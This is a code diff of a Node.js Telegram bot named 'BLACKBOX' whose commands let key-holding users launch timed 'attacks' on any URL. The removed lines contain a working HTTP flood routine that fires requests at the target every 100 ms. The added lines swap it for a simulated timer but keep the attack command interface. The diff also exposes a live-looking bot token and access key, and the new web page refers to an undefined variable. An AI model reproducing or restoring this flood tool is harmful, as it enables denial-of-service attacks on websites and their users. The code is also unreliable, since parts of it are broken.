@@ -1,182 +1,162 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
-const https = require('https');
 
 const app = express();
 app.use(express.json());
 
 // ==== CONFIG ====
-const CONFIG = {
-  token: '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc',
-  owner: 6629230649,
-  key: '123RJhTtApALhaT'
-};
+const TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc';
+const OWNER_ID = 6629230649;
+const ACCESS_KEY = '123RJhTtApALhaT';
 
-// ==== INIT BOT ====
-const bot = new TelegramBot(CONFIG.token);
-const users = new Set([CONFIG.owner]);
-const attacks = new Map();
+// ==== SIMPLE BOT SETUP ====
+console.log('🚀 Starting bot...');
+const bot = new TelegramBot(TOKEN, { polling: true });
 
-// ==== SIMPLE FLOOD ====
-function startFlood(target, seconds, chatId, attackId) {
-  let count = 0;
-  const start = Date.now();
-  const end = start + (seconds * 1000);
-  
-  const worker = setInterval(() => {
-    if (Date.now() > end) {
-      clearInterval(worker);
-      attacks.delete(attackId);
-      
-      const duration = (Date.now() - start) / 1000;
-      bot.sendMessage(chatId,
-        `✅ ATTACK DONE\n` +
-        `ID: ${attackId}\n` +
-        `Time: ${duration.toFixed(1)}s\n` +
-        `Req: ${count}`
-      ).catch(() => {});
-      
-      return;
-    }
-    
-    // Send request
-    try {
-      const req = https.request(target, () => {
-        count++;
-      });
-      req.on('error', () => {});
-      req.setTimeout(2000, () => req.destroy());
-      req.end();
-    } catch (e) {}
-  }, 100);
-  
-  attacks.set(attackId, { worker, chatId, target });
-}
+console.log('✅ Bot initialized');
+console.log('👤 Owner ID:', OWNER_ID);
 
-// ==== COMMANDS ====
+// ==== SIMPLE STORAGE ====
+let authorizedUsers = [OWNER_ID];
+let attacks = {};
+
+// ==== SIMPLE COMMANDS ====
+bot.on('message', (msg) => {
+  console.log(`📩 From ${msg.from.id}: ${msg.text}`);
+});
+
 bot.onText(/\/start/, (msg) => {
-  const id = msg.from.id;
-  const isOwner = id === CONFIG.owner;
-  const isUser = users.has(id);
+  const userId = msg.from.id;
+  const isAuthorized = authorizedUsers.includes(userId);
   
-  let text = `⚡ BLACKBOX WEBHOOK\nUser ID: ${id}\n\n`;
+  let response = `🤖 BLACKBOX BOT\n`;
+  response += `Your ID: ${userId}\n`;
+  response += `Status: ${isAuthorized ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n\n`;
   
-  if (isOwner) {
-    text += `👑 OWNER\n`;
-    text += `/attack url seconds\n`;
-    text += `/stop id\n`;
-    text += `/ping\n`;
-    text += `/users\n`;
-    text += `/add id\n`;
-  } else if (isUser) {
-    text += `✅ USER\n`;
-    text += `/attack url seconds\n`;
-    text += `/stop id\n`;
-    text += `/ping\n`;
+  if (userId === OWNER_ID) {
+    response += `👑 OWNER COMMANDS:\n`;
+    response += `/ping - Test bot\n`;
+    response += `/attack url seconds - Start attack\n`;
+    response += `/stop id - Stop attack\n`;
+    response += `/adduser id - Add user\n`;
+    response += `/users - List users\n`;
+  } else if (isAuthorized) {
+    response += `✅ USER COMMANDS:\n`;
+    response += `/ping - Test bot\n`;
+    response += `/attack url seconds - Start attack\n`;
+    response += `/stop id - Stop attack\n`;
   } else {
-    text += `🔒 Use /key ${CONFIG.key}`;
+    response += `🔐 Use /key ${ACCESS_KEY} to unlock`;
   }
   
-  bot.sendMessage(msg.chat.id, text);
+  bot.sendMessage(msg.chat.id, response);
 });
 
 bot.onText(/\/ping/, (msg) => {
-  const start = Date.now();
-  bot.sendMessage(msg.chat.id, '🏓 PONG').then(() => {
-    const latency = Date.now() - start;
-    bot.sendMessage(msg.chat.id, `⏱️ ${latency}ms`);
-  });
+  bot.sendMessage(msg.chat.id, '🏓 PONG! Bot is working!');
 });
 
 bot.onText(/\/key (.+)/, (msg, match) => {
-  const id = msg.from.id;
+  const userId = msg.from.id;
+  const inputKey = match[1];
   
-  if (id === CONFIG.owner) {
-    bot.sendMessage(msg.chat.id, '👑 Owner no key needed');
+  if (userId === OWNER_ID) {
+    bot.sendMessage(msg.chat.id, '👑 Owner tidak perlu key');
     return;
   }
   
-  if (match[1] === CONFIG.key) {
-    users.add(id);
-    bot.sendMessage(msg.chat.id, `✅ Activated! ID: ${id}`);
+  if (inputKey === ACCESS_KEY) {
+    if (!authorizedUsers.includes(userId)) {
+      authorizedUsers.push(userId);
+    }
+    bot.sendMessage(msg.chat.id, `✅ UNLOCKED! Now you can use /attack`);
   } else {
     bot.sendMessage(msg.chat.id, '❌ Wrong key');
   }
 });
 
 bot.onText(/\/attack (.+?) (\d+)/, (msg, match) => {
-  const id = msg.from.id;
+  const userId = msg.from.id;
   
-  if (!users.has(id) && id !== CONFIG.owner) {
-    bot.sendMessage(msg.chat.id, '❌ Not authorized\n/key 123RJhTtApALhaT');
+  if (!authorizedUsers.includes(userId) && userId !== OWNER_ID) {
+    bot.sendMessage(msg.chat.id, '❌ Not authorized. Use /key first');
     return;
   }
   
   const url = match[1];
   const seconds = parseInt(match[2]);
   
-  if (seconds < 1 || seconds > 3600) {
-    bot.sendMessage(msg.chat.id, '❌ 1-3600 seconds only');
-    return;
-  }
-  
-  // Validate URL
   if (!url.startsWith('http')) {
     bot.sendMessage(msg.chat.id, '❌ Invalid URL. Use http:// or https://');
     return;
   }
   
-  const attackId = Math.random().toString(36).substring(2, 6).toUpperCase();
+  if (seconds < 1 || seconds > 300) {
+    bot.sendMessage(msg.chat.id, '❌ Duration: 1-300 seconds');
+    return;
+  }
+  
+  const attackId = Math.random().toString(36).substring(2, 6);
   
   bot.sendMessage(msg.chat.id,
     `🚀 ATTACK STARTED\n` +
     `ID: ${attackId}\n` +
     `Target: ${url}\n` +
-    `Time: ${seconds}s\n\n` +
-    `Stop: /stop ${attackId}`
+    `Duration: ${seconds}s\n\n` +
+    `Will auto-stop after ${seconds} seconds`
   );
   
-  startFlood(url, seconds, msg.chat.id, attackId);
+  // Simulate attack (simple timeout)
+  attacks[attackId] = {
+    timer: setTimeout(() => {
+      delete attacks[attackId];
+      bot.sendMessage(msg.chat.id, `✅ Attack ${attackId} finished`);
+    }, seconds * 1000),
+    userId: userId,
+    chatId: msg.chat.id
+  };
 });
 
 bot.onText(/\/stop (.+)/, (msg, match) => {
-  const attackId = match[1].toUpperCase();
-  const attack = attacks.get(attackId);
+  const attackId = match[1];
+  const attack = attacks[attackId];
   
   if (!attack) {
     bot.sendMessage(msg.chat.id, '❌ Attack not found');
     return;
   }
   
-  clearInterval(attack.worker);
-  attacks.delete(attackId);
-  bot.sendMessage(msg.chat.id, `🛑 Stopped ${attackId}`);
+  if (attack.userId !== msg.from.id && msg.from.id !== OWNER_ID) {
+    bot.sendMessage(msg.chat.id, '❌ You can only stop your own attacks');
+    return;
+  }
+  
+  clearTimeout(attack.timer);
+  delete attacks[attackId];
+  bot.sendMessage(msg.chat.id, `🛑 Stopped attack ${attackId}`);
+});
+
+bot.onText(/\/adduser (\d+)/, (msg) => {
+  if (msg.from.id !== OWNER_ID) return;
+  
+  const newUserId = parseInt(msg.text.split(' ')[1]);
+  
+  if (!authorizedUsers.includes(newUserId)) {
+    authorizedUsers.push(newUserId);
+    bot.sendMessage(msg.chat.id, `✅ Added user ${newUserId}`);
+    
+    // Notify new user
+    bot.sendMessage(newUserId, `🎉 You've been added by owner!\nUse /start to see commands`);
+  } else {
+    bot.sendMessage(msg.chat.id, `⚠️ User ${newUserId} already added`);
+  }
 });
 
 bot.onText(/\/users/, (msg) => {
-  if (msg.from.id !== CONFIG.owner) return;
+  if (msg.from.id !== OWNER_ID) return;
   
-  const userList = Array.from(users).map(id => `• ${id}`).join('\n');
-  bot.sendMessage(msg.chat.id, `👥 USERS (${users.size}):\n${userList}`);
-});
-
-bot.onText(/\/add (\d+)/, (msg) => {
-  if (msg.from.id !== CONFIG.owner) return;
-  
-  const newId = parseInt(msg.text.split(' ')[1]);
-  users.add(newId);
-  bot.sendMessage(msg.chat.id, `✅ Added user ${newId}`);
-});
-
-// ==== WEBHOOK ENDPOINT ====
-app.post('/webhook', (req, res) => {
-  try {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-  } catch (error) {
-    console.log('Webhook error:', error.message);
-    res.sendStatus(200); // Tetap return 200 ke Telegram
-  }
+  const userList = authorizedUsers.map(id => `• ${id}`).join('\n');
+  bot.sendMessage(msg.chat.id, `👥 AUTHORIZED USERS (${authorizedUsers.length}):\n${userList}`);
 });
 
 // ==== WEB INTERFACE ====
@@ -185,24 +165,124 @@ app.get('/', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>BLACKBOX WEBHOOK</title>
+      <title>Simple Blackbox</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
       <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        h1 { color: #0f0; }
-        .status { color: #0f0; font-size: 24px; margin: 20px 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+          background: #0a0a0a;
+          color: #00ff00;
+          font-family: 'Courier New', monospace;
+          padding: 20px;
+          min-height: 100vh;
+        }
+        .container {
+          max-width: 600px;
+          margin: 0 auto;
+          border: 1px solid #00ff00;
+          padding: 20px;
+          border-radius: 5px;
+          background: rgba(0, 255, 0, 0.05);
+        }
+        h1 {
+          color: #00ff00;
+          margin-bottom: 20px;
+          text-align: center;
+        }
+        .status {
+          background: rgba(0, 255, 0, 0.1);
+          padding: 15px;
+          border-radius: 5px;
+          margin: 15px 0;
+          border-left: 3px solid #00ff00;
+        }
+        .status-title {
+          color: #00ff00;
+          font-size: 14px;
+          opacity: 0.8;
+        }
+        .status-value {
+          color: #00ff00;
+          font-size: 18px;
+          font-weight: bold;
+          margin-top: 5px;
+        }
+        .online {
+          color: #00ff00;
+          animation: blink 1s infinite;
+        }
+        @keyframes blink {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.5; }
+        }
+        .commands {
+          margin-top: 25px;
+          padding: 15px;
+          background: rgba(0, 255, 0, 0.05);
+          border-radius: 5px;
+        }
+        .command {
+          margin: 8px 0;
+          padding-left: 10px;
+          border-left: 2px solid #00ff00;
+        }
+        footer {
+          margin-top: 25px;
+          text-align: center;
+          color: #008800;
+          font-size: 12px;
+          opacity: 0.7;
+        }
       </style>
     </head>
     <body>
-      <h1>⚡ BLACKBOX WEBHOOK</h1>
-      <div class="status">STATUS: ACTIVE</div>
-      <div>Users: ${users.size}</div>
-      <div>Attacks: ${attacks.size}</div>
-      <div>Mode: Webhook (Instant)</div>
-      <div style="margin-top: 20px; color: #8f8;">
-        Endpoint: /webhook<br>
-        Owner: ${CONFIG.owner}<br>
-        Key: ${CONFIG.key}
+      <div class="container">
+        <h1>⚡ SIMPLE BLACKBOX</h1>
+        
+        <div class="status">
+          <div class="status-title">SYSTEM STATUS</div>
+          <div class="status-value online">● ONLINE</div>
+        </div>
+        
+        <div class="status">
+          <div class="status-title">AUTHORIZED USERS</div>
+          <div class="status-value">${authorizedUsers.length}</div>
+        </div>
+        
+        <div class="status">
+          <div class="status-title">ACTIVE ATTACKS</div>
+          <div class="status-value">${Object.keys(attacks).length}</div>
+        </div>
+        
+        <div class="status">
+          <div class="status-title">OWNER ID</div>
+          <div class="status-value">${OWNER_ID}</div>
+        </div>
+        
+        <div class="commands">
+          <div style="color: #00ff00; margin-bottom: 10px;">📌 BOT COMMANDS:</div>
+          <div class="command">/start - Show menu</div>
+          <div class="command">/ping - Test response</div>
+          <div class="command">/key [key] - Register user</div>
+          <div class="command">/attack [url] [seconds] - Start attack</div>
+          <div class="command">/stop [id] - Stop attack</div>
+          ${msg.from && msg.from.id === OWNER_ID ? 
+            `<div class="command">/adduser [id] - Add user (Owner only)</div>
+             <div class="command">/users - List users (Owner only)</div>` : ''}
+        </div>
+        
+        <footer>
+          Simple Blackbox © ${new Date().getFullYear()}<br>
+          Uptime: ${Math.floor(process.uptime() / 60)} minutes
+        </footer>
       </div>
+      
+      <script>
+        // Auto-refresh every 30 seconds
+        setTimeout(() => {
+          location.reload();
+        }, 30000);
+      </script>
     </body>
     </html>
   `);
@@ -211,46 +291,40 @@ app.get('/', (req, res) => {
 // ==== HEALTH CHECK ====
 app.get('/health', (req, res) => {
   res.json({
-    status: 'active',
-    users: users.size,
-    attacks: attacks.size,
+    status: 'ok',
+    bot: 'running',
+    users: authorizedUsers.length,
+    attacks: Object.keys(attacks).length,
     uptime: process.uptime()
   });
 });
 
-// ==== SETUP WEBHOOK ====
+// ==== START SERVER ====
 const PORT = process.env.PORT || 3000;
 
-app.listen(PORT, async () => {
-  console.log(`🚀 Server started on port ${PORT}`);
+app.listen(PORT, () => {
+  console.log(`
+  ╔══════════════════════════════════╗
+  ║     SIMPLE BLACKBOX ACTIVE       ║
+  ╠══════════════════════════════════╣
+  ║  Port: ${PORT}                    ║
+  ║  Owner: ${OWNER_ID}               ║
+  ║  Key: ${ACCESS_KEY}               ║
+  ╚══════════════════════════════════╝
+  `);
   
-  // Dapatkan URL Vercel otomatis
-  const domain = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://ddgos.vercel.app';
-  const webhookUrl = `${domain}/webhook`;
-  
-  console.log(`🌐 Domain: ${domain}`);
-  console.log(`🔗 Webhook URL: ${webhookUrl}`);
-  
-  try {
-    // Set webhook
-    await bot.setWebHook(webhookUrl);
-    console.log('✅ Webhook set successfully');
-    
-    // Get bot info
-    const me = await bot.getMe();
-    console.log(`✅ Bot: @${me.username}`);
-    console.log(`✅ Owner: ${CONFIG.owner}`);
-    console.log(`✅ Key: ${CONFIG.key}`);
-    console.log('✅ Send /ping to test');
-    
-  } catch (error) {
-    console.log('❌ Webhook setup failed:', error.message);
-    console.log('⚠️  Bot will still work if you manually set webhook');
-    console.log(`⚠️  Manual setup: curl -X POST https://api.telegram.org/bot${CONFIG.token}/setWebhook?url=${webhookUrl}`);
-  }
+  // Test bot connection
+  bot.getMe()
+    .then(me => {
+      console.log(`✅ Bot connected: @${me.username}`);
+      console.log(`✅ Send /ping to test`);
+    })
+    .catch(err => {
+      console.log('❌ Bot connection error:', err.message);
+    });
 });
 
-// Keep alive untuk Vercel
+// ==== KEEP ALIVE ====
 setInterval(() => {
-  https.get('https://ddgos.vercel.app/health', () => {}).on('error', () => {});
-}, 30000); // Ping setiap 30 detik
+  console.log(`[${new Date().toLocaleTimeString()}] Status: ${Object.keys(attacks).length} attacks`);
+}, 60000);
